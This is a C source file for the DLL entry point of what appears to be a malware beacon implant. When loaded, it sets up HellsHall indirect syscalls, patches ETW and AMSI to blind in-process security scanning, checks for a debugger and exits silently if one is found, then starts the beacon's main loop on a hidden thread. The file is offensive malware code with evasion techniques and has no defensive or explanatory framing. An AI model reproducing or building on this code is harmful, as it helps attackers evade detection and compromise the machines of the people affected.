// DLL entry point. The beacon is a DllMain-less DLL: we route through a
// tiny custom entry that spins the main beacon loop on a dedicated thread
// so the host process can continue unimpeded.

#include "beacon.h"

extern void beacon_main(void);

static DWORD WINAPI beacon_thread(LPVOID p) {
    (void)p;
    beacon_main();
    return 0;
}

BOOL WINAPI DllEntry(HINSTANCE inst, DWORD reason, LPVOID reserved) {
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(inst);

        // Initialize HellsHall SSN table and gadget before any Nt*_i wrapper
        // is called. Without this g_hh_gadget == NULL and the ASM stub does
        // jmp r11 -> address 0 -> ACCESS_VIOLATION -> ERROR_DLL_INIT_FAILED.
        hh_init();

        // Patch ETW and AMSI immediately so any in-process scanning sees
        // no-ops; also apply basic anti-debug probes and bail out silently
        // on suspicious environments.
        opsec_patch_etw();
        opsec_patch_amsi();
        if (opsec_is_debugged()) return TRUE;

        HANDLE t = CreateThread(NULL, 0, beacon_thread, NULL, 0, NULL);
        if (t) CloseHandle(t);
    }
    return TRUE;
}
